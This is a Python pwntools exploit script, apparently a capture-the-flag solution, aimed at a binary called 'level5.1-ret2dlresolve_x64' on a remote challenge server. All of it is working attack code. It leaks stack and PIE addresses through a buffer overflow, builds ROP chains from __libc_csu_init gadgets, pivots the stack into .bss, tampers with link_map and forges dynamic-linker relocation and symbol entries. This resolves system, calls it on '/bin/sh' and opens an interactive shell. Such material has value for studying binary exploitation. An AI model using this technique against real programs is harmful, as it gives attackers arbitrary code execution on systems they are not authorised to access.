from pwn import *
import struct
context.log_level = "debug"

#r = process("./level5.1-ret2dlresolve_x64")
r = remote("pwn.sixstars.team", 23005)
elf = ELF("./level5.1-ret2dlresolve_x64")
#print r.pid
#pause()

r.recv()
r.send('a'*0x1f)
r.recvuntil("once again")
r.sendline('a'*0x28+'\x7d')
r.sendline('a'*0x18)
r.recvuntil('a'*0x18)
stack = u64(r.recv(6)+'\x00'*2)-0x20268
info("Stack: "+hex(stack))

r.sendline('a'*0x28+'\x7d')
r.sendline('a'*0x10)
r.recvuntil('a'*0x10)
pie = u64(r.recv(6)+'\x00'*2)-0x7a0
info("BASE: " + hex(pie))
elf.address = pie

r.recv()

########################################
main = 0x0000000000000A2C + pie
p_rdi = 0x0000000000000b73 + pie
p_rsi_r15 = 0x0000000000000b71 + pie
p_rsp_rrr = 0x0000000000000b6d + pie
csu = 0xb66 + pie
csuu = 0xb50 + pie
read = pie + 0xae1
bss = pie + 0x201808
jmprel = pie + 0x640
relaent = 0x18
symtab = pie + 0x2c8
syment = 0x18
strtab = pie + 0x460

info("JMPREL: " + hex(jmprel))
info("SYMTAB: " + hex(symtab))
info("STRTAB: " + hex(strtab))

plt = pie + 0x710
addr_rel = bss
addr_sym = addr_rel + 0x18
addr_str = addr_sym + 0x18
reloc_offset = (addr_rel - jmprel) / relaent
r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
st_name = addr_str - strtab
info("reloc_offset: "+hex(reloc_offset))
info("r_info: "+hex(r_info))
info("st_name: "+hex(st_name))

buf = struct.pack('<QQQ', elf.got['alarm']-pie, r_info, 0)
buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)
buf += "system\x00\x00"
buf += "/bin/sh\x00"
##################################

stack = bss + 0x300

# swap stack
sh = 'a'*0x28
sh += p64(pie+0xb6a)
sh += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x200) + p64(stack) + p64(0) + p64(read)
r.sendline(sh)

sh = 'a'*0x28
sh += p64(csuu)
sh += p64(0)*7
sh += p64(p_rsp_rrr)        # change stack to bss+0x300
sh += p64(stack)
r.sendline(sh)

# leak linkmap
stackdata = p64(0)*3
stackdata += p64(csu)
stackdata += p64(0)
stackdata += p64(0) + p64(1) + p64(elf.got['write']) + p64(0x8) + p64(pie+0x201008) + p64(1) + p64(csuu)
stackdata += p64(0)*7

stackdata += p64(csu)
stackdata += p64(0)
stackdata += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x1d8) + p64(stack+0xe0) + p64(0) + p64(csuu)

r.sendline(stackdata)

link_map = u64(r.recv(6) + '\x00'*2)
info("link_map: " + hex(link_map))

# change linkmap + 0x1c8
sh = p64(0)*7
sh += p64(csu)
sh += p64(0)
sh += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x8) + p64(link_map+0x1c8) + p64(0) + p64(csuu)
sh += p64(0)*7

sh += p64(csu)
sh += p64(0)
sh += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x100) + p64(bss) + p64(0) + p64(csuu)
sh += p64(0)*7

#getshell
#sh += p64(csu)
#sh += p64(0)
#sh += p64(0) + p64(1) + p64(elf.got['write']) + p64(0) + p64(0) + p64(1) + p64(csuu)
#sh += p64(0)*7
sh += p64(p_rdi)
sh += p64(bss+0x38)
sh += p64(plt)
sh += p64(reloc_offset)

r.send(sh)
r.send(p64(0))
r.sendline(buf)

r.interactive()

